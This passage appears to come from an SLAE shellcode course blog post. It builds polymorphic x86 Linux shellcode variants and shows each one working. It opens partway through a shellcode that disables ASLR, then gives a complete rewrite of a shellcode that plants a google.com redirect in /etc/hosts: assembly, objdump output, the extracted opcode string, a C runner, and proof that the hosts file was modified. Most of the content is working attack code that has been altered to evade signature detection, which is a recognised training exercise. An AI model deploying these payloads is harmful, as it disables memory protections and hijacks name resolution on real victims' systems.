 "\x6e\x64\x6f\x6d\xc7\x44\x24\xe8\x6c"
 "\x2f\x72\x61\xc7\x44\x24\xe4\x65\x72"
 "\x6e\x65\xc7\x44\x24\xe0\x79\x73\x2f"
 "\x6b\xc7\x44\x24\xdc\x6f\x63\x2f\x73"
 "\xc7\x44\x24\xd8\x2f\x2f\x70\x72\x83"
 "\xec\x28\x89\xe3\x66\xb9\x01\x03\x66"
 "\xba\xa1\x02\x66\x83\xc2\x1b\xb0\x05"
 "\xcd\x80\x89\xc3\x53\x66\xb9\x30\x3b"
 "\x66\x51\x89\xe1\xc1\xea\x10\x42\xb0"
 "\x04\xcd\x80\xb0\x01\xcd\x80";

main()
{
printf("Shellcode Length: %d\n", strlen(code));

int (*ret)() = (int(*)())code;

ret();
}
</pre>

<p style="text-align:justify;">
Compiling and running the above program will change the value inside the <b>/proc/sys/kernel/randomize_va_space</b> from <b>two(2)</b> to <b>zero(0)</b>.
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># cat /proc/sys/kernel/randomize_va_space
2
<span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span>#  gcc -fno-stack-protector -z execstack -o sh sh.c && ./sh
Shellcode Length: 124
<span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># cat /proc/sys/kernel/randomize_va_space
0
</pre>

As previously seen in this article, the length of the new <it>shellcode</it> will be checked in order to be align with the rules of the exercise where the polymorphic version is not allowed to exceed the 150% of the original <it>shellcode</it>. The calculation below shows that the exercise rule is followed.

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
original shelcode length : 83
polymorphic version length : 124 
83 * 1.5 = 124.5
</pre>

<hr>

<h2><span style="color:#339966;"><strong>Add map in /etc/hosts file</strong></span></h2>  

<p style="text-align:justify;">
The third shellcode to analyse adds a new entry in hosts file pointing google.com to 127.1.1.1 and can be found at <a href="http://shell-storm.org/">shell-storm.org</a> Also, the original shellcode can be found at this <a href="http://shell-storm.org/shellcode/files/shellcode-893.php">link</a>. In general, Linux systems contain a hosts file used to translate hostnames to IP addresses. The hosts file is a simple text file located in the etc folder on Linux and Mac OS ( <b>/etc/hosts</b> ).

The following output shows the assembly code from the original shellcode.
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
global _start

section .text

_start:
xor ecx, ecx
mul ecx
mov al, 0x5
push ecx
push 0x7374736f ;/etc///hosts
push 0x682f2f2f
push 0x6374652f
mov ebx, esp
mov cx, 0x401 ;permmisions
int 0x80 ;syscall to open file

xchg eax, ebx
push 0x4
pop eax
jmp short _load_data ;jmp-call-pop technique to load the map

_write:
 pop ecx
 push 20 ;length of the string, dont forget to modify if changes the map
 pop edx
 int 0x80 ;syscall to write in the file

push 0x6
pop eax
int 0x80 ;syscall to close the file

push 0x1
pop eax

int 0x80 ;syscall to exit

_load_data:
 call _write
 google db "127.1.1.1 google.com"
</pre>

<p style="text-align:justify;">
Furthermore, the instructions above can be changed in order to perform polymorphism while altering the coding format without changing the functionality of the program. First, the instructions that represent the <b>open()</b> system call will be changed as follows
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
;Original instructions 

xor ecx, ecx
mul ecx
mov al, 0x5
push ecx
push 0x7374736f ;/etc///hosts
push 0x682f2f2f
push 0x6374652f
mov ebx, esp
mov cx, 0x401 ;permmisions
int 0x80 ;syscall to open file

xchg eax, ebx
push 0x4
pop eax
jmp short _load_data ;jmp-call-pop technique to load the map

;Altered instructions 

xor ecx, ecx
cdq
xor eax, eax 
mov al, 0x5
mov DWORD [esp-0x4],ecx
mov DWORD [esp-0x8],0x7374736f
mov DWORD [esp-0xc],0x682f2f2f
mov DWORD [esp-0x10],0x6374652f
sub esp,0x10
mov ebx,esp
mov cx, 0x3b1 ;permmisions
add cx, 0x50 
int 0x80 ;syscall to open file
mov ebx, eax
xor eax, eax
jmp short _ldata ;jmp-call-pop technique to load the map
</pre>

<p style="text-align:justify;">
The above instructions have been altered in order to achieve polymorphism. The technique <b>jmp-pop-call</b> will still remains the same with changes only in label names. Also, the <b>mul ecx</b> replaced with , <b>cdq</b> and <b>xor eax, eax ,</b> zeroing out the <b>eax</b> and <b>edx</b> registers accordingly. Additionally, the <b>push</b> instruction has been altered using <b>mov</b> instruction and the file permissions value <b>0x401</b> in hex has been splitted into two values , <b>0x3b1</b> and <b>0x50</b> instead of one, adding them together using the <b>add</b> instruction at the 8bits register <b>cx</b>. The <b>xchg</b> instruction has been changed to <b>mov</b> instruction as the <b>ebx</b> will be assigned with the value <b>0x3</b> which represents the hosts file descriptor returned from the <b>open()</b> system call. The <b>xchg</b> used from <it>shellcode</it> writer to reduce the <it>shellcode</it> length as it needs two bytes, against the three bytes that <b>mov</b> needs. Also , the <it>shellcode</it> writer uses <b>push</b> and <b>pop</b> to load the <b>0x4</b> immediate value into <b>eax</b> register indicating the <b>write()</b> system call. The alteration here is that the <b>push</b> and <b>pop</b> replaced with <b>mov</b> and also the location of the instruction moved after the <b>jmp short</b> instruction and before the <b>int 0x80</b> instruction.

Furthermore, the label <b>_load_data</b> will be changed with <b>_ldata</b> at <b>jmp short</b> instruction. Also, as already mentioned the <b>mov</b> instruction above is doing the same thing as the <b>push</b> instruction, and that because the <b>push</b> instruction is decrementing the stack pointer by the operand size, then moves the operand to the location pointed by the stack pointer. Furthermore, the <b>sub ebx, 0x10</b> instruction used to make room for four local variables in the stack to place the string <b>/etc///hosts</b> and the <b>mov ebx, esp</b> instruction used for stack alignment setting the pointer at the top of the stack.

To continue further the write system call instructions will be altered as follows
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
;Original instructions

_write:
pop ecx
push 20 
pop edx
int 0x80

;Altered instructions

write_data: 
pop ecx
mov dl, 0x12
add dl, 0x3
mov al, 0x4
int 0x80
</pre>

<p style="text-align:justify;">

The main alteration here is the <b>pop</b> and <b>push</b> instructions which altered into <b>mov.</b> Also in order to avoid null bytes the <b>edx</b> register changed into the lower byte register <b>dl</b>. Additionally the <b>_write</b> label has been changed into <b>write_data</b>. Following, the <b>0x15</b> hex value which represents the length of the message along with the additional carriage return character has been splitted into two values <b>0x12</b> and <b>0x3</b> instead of one value, then adding them together using the <b>add</b> instruction.

The next instructions to be altered are representing the <b>close</b> system call.
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
;Original instructions

push 0x6
pop eax
int 0x80 ;syscall to close the file

;Altered instructions

add al,0x2
int 0x80 ;syscall to close the file
</pre>

<p style="text-align:justify;">
The above instructions from the original <it>shellcode</it>, <b>pop</b> and <b>push</b> are changed with the <b>add</b> instruction. The add instruction adds the <b>0x2</b> immediate value with the <b>0x4</b> value previously assigned at the lower byte register <b>al</b> in order to execute the <b>close</b> system call with <b>int 0x80</b> instruction.

The next instructions to be altered are representing the <b>exit</b> system call.
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
;Original instructions

push 0x1
pop eax

int 0x80 ;syscall to exit

;Altered instructions

xor eax,eax
mov al,0x1
int 0x80 ;syscall to exit
</pre>

<p style="text-align:justify;">
The above instructions from the original <it>shellcode</it>, <b>pop</b> and <b>push</b> are changed with the <b>xor</b> and <b>mov</b> instructions. The <b>xor</b> instruction used to zero out the <b>eax</b> register and the <b>mov</b> instruction used to assign the immediate value at the lower byte <b>al</b> register in order to execute the exit system call with <b>int 0x80</b> instruction.

The final instructions exist inside the <b>load_data</b> label of the original <it>shellcode</it> and will be altered as follows :
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
;Original instructions

_load_data:
call _write
google db "127.1.1.1 google.com"

;Altered instructions

data:
call wdata
message db "127.1.1.1 google.com",0x0A
</pre>


<p style="text-align:justify;">
As said before and shown above, the label <b>_load_data</b> changed into <b>_ldata</b> and also the label <b>_write</b> changed into <b>write_data</b> at the <b>call</b> instruction. Furthermore, the <b>google</b> tag changed into <b>message,</b> and the carriage return character has been added at the end of the message.

The following output shows the final polymorphic shellcode
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
; poly_map.nasm
;
; Adding a record in /etc/hosts
;
; Author: Xenofon Vassilakopoulos
;
; Student ID: SLAE - 1314

global _start

section .text

_start:
 xor ecx, ecx
 xor edx, edx
 xor eax, eax
 mov DWORD [esp-0x4],ecx
 mov DWORD [esp-0x8],0x7374736f
 mov DWORD [esp-0xc],0x682f2f2f
 mov DWORD [esp-0x10],0x6374652f
 sub esp,0x10
 mov ebx,esp
 mov cx, 0x3b1 ;permmisions
 add cx, 0x50
 mov al, 0x5
 int 0x80 ;syscall to open file
 mov ebx, eax
 xor eax, eax
 jmp short _ldata ;jmp-call-pop technique to load the map

write_data:
 pop ecx
 mov dl,0x12
 add dl,0x3
 mov al,0x4
 int 0x80 ;syscall to write in the file

 add al,0x2
 int 0x80 ;syscall to close the file

 xor eax,eax
 mov al,0x1
 int 0x80 ;syscall to exit

_ldata:
 call write_data
 message db "127.1.1.1 google.com",0x0A
</pre>

<p style="text-align:justify;">
Proceeding further, the polymorphic <it>shellcode</it> is ready for testing. First, the program will be compiled using the following shell script
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># cat compile.sh
#!/bin/bash

echo '[+] Assembling with Nasm ... '
nasm -f elf -o $1.o $1.nasm
echo '[+] Linking ...'
ld -z execstack -o $1 $1.o
echo '[+] Done!'
root@kali:~/Documents/SLAE/Assignment6# ./compile.sh omap
[+] Assembling with Nasm ...
[+] Linking ...
[+] Done!
</pre>


<p style="text-align:justify;">
Then the opcodes will be checked if null bytes exist using <b>objdump</b>
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># objdump -d omap -M intel

omap: file format elf32-i386

Disassembly of section .text:

08049000 &lt;_start>:
8049000: 31 c9 xor ecx,ecx
8049002: 31 c0 xor eax,eax
8049004: 89 4c 24 fc mov DWORD PTR [esp-0x4],ecx
8049008: c7 44 24 f8 6f 73 74 mov DWORD PTR [esp-0x8],0x7374736f
804900f: 73
8049010: c7 44 24 f4 2f 2f 2f mov DWORD PTR [esp-0xc],0x682f2f2f
8049017: 68
8049018: c7 44 24 f0 2f 65 74 mov DWORD PTR [esp-0x10],0x6374652f
804901f: 63
8049020: 83 ec 10 sub esp,0x10
8049023: 89 e3 mov ebx,esp
8049025: 66 b9 b1 03 mov cx,0x3b1
8049029: 66 83 c1 50 add cx,0x50
804902d: b0 05 mov al,0x5
804902f: cd 80 int 0x80
8049031: 89 c3 mov ebx,eax
8049033: 31 c0 xor eax,eax
8049035: eb 12 jmp 8049049 

08049037 :
8049037: 59 pop ecx
8049038: b2 12 mov dl,0x12
804903a: 80 c2 02 add dl,0x2
804903d: b0 04 mov al,0x4
804903f: cd 80 int 0x80
8049041: 04 02 add al,0x2
8049043: cd 80 int 0x80
8049045: b0 01 mov al,0x1
8049047: cd 80 int 0x80

08049049 :
8049049: e8 e9 ff ff ff call 8049037 

0804904e :
804904e: 31 32 xor DWORD PTR [edx],esi
8049050: 37 aaa
8049051: 2e 31 2e xor DWORD PTR cs:[esi],ebp
8049054: 31 2e xor DWORD PTR [esi],ebp
8049056: 31 20 xor DWORD PTR [eax],esp
8049058: 67 6f outs dx,DWORD PTR ds:[si]
804905a: 6f outs dx,DWORD PTR ds:[esi]
804905b: 67 6c ins BYTE PTR es:[di],dx
804905d: 65 2e 63 6f 6d gs arpl WORD PTR cs:[edi+0x6d],bp
8049062: 0a .byte 0xa
8049063: 0d .byte 0xd
</pre>

<p style="text-align:justify;">
As it's shown above, it is all good with the polymorphic <it>shellcode</it> so it's everything ready to proceed further and run it. Before doing that the shellcode must be produced using <b>objdump</b> as follows
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># objdump -d ./omap|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-7 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
"\x31\xc9\x31\xc0\x89\x4c\x24\xfc\xc7\x44\x24\xf8\x6f\x73\x74\x73\xc7\x44\x24\xf4\x2f\x2f\x2f\x68\xc7\x44\x24\xf0\x2f\x65\x74\x63\x83\xec\x10\x89\xe3\x66\xb9\xb1\x03\x66\x83\xc1\x50\xb0\x05\xcd\x80\x89\xc3\x31\xc0\xeb\x14\x59\xb2\x12\x80\xc2\x02\xb0\x04\xcd\x80\x04\x02\xcd\x80\x31\xc0\xb0\x01\xcd\x80\xe8\xe7\xff\xff\xff\x31\x32\x37\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x0a\x0d"
</pre>

<p style="text-align:justify;">
Following is the C program file where the polymorphic <it>shellcode</it> will be placed in order to be compiled and run
</p>


<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
#include &lt;stdio.h>
#include &lt;string.h> 

unsigned char code[] = \
"\x31\xc9\x31\xc0\x89\x4c\x24\xfc\xc7\x44\x24\xf8\x6f\x73\x74\x73\xc7\x44\x24\xf4\x
2f\x2f\x2f\x68\xc7\x44\x24\xf0\x2f\x65\x74\x63\x83\xec\x10\x89\xe3\x66\xb9\xb1\x03\
x66\x83\xc1\x50\xb0\x05\xcd\x80\x89\xc3\x31\xc0\xeb\x14\x59\xb2\x12\x80\xc2\x02\xb0
\x04\xcd\x80\x04\x02\xcd\x80\x31\xc0\xb0\x01\xcd\x80\xe8\xe7\xff\xff\xff\x31\x32\x3
7\x2e\x31\x2e\x31\x2e\x31\x20\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x0a\x0d";

int main()
{
printf("Shellcode Length: %d\n", strlen(code));

int (*ret)() = (int(*)())code;

ret();
}
</pre>

<p style="text-align:justify;">
Next the executable will be compiled and run as seen below
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;"><span style="color:#cd0000;"><b>root@slae</b></span>:<span style="color:#a7a7f3;"><b>/home/xenofon/Documents/Assignment6</b></span># gcc -fno-stack-protector -g -z execstack -o sh sh.c && ./sh
Shellcode Length: 102
</pre>

<p style="text-align:justify;">
Now that the <it>shellcode</it> executed, the <b>/etc/hosts</b> file will be checked to see if the new record has been inserted successfully.
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
127.0.0.1 localhost
127.0.1.1 kali

# The following lines are desirable for IPv6 capable hosts
::1 localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

127.1.1.1 google.com
</pre>

<p style="text-align:justify;">
As&nbsp; seen previously in this article, the length of the new <it>shellcode</it> must be checked in order to align with the rules of the exercise where the polymorphic version is not allowed to exceed the 150% of the original shellcode.
</p>

<pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
original shelcode length : 77
polymorphic version length : 102 
77 * 1.5 = 115.5
</pre>

